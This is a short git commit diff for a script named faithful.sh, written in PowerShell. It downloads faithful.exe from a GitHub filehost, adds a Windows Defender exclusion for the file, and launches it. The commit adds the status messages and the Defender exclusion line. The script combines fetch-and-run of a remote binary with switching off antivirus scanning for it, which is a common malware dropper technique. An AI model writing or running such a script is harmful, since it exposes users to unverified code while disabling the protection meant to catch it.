4a817cd16e9559e94c987abf7f7641a2350ce15a
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-11 17:20:35 +0800

    adding more stuff

--- faithful.sh
+++ faithful.sh
@@ -1,2 +1,6 @@
+Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
+Write-Output "Adding Windows Defender exclusion..."
+Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Start-Process ("faithful.exe")
+Write-Output "Done!"
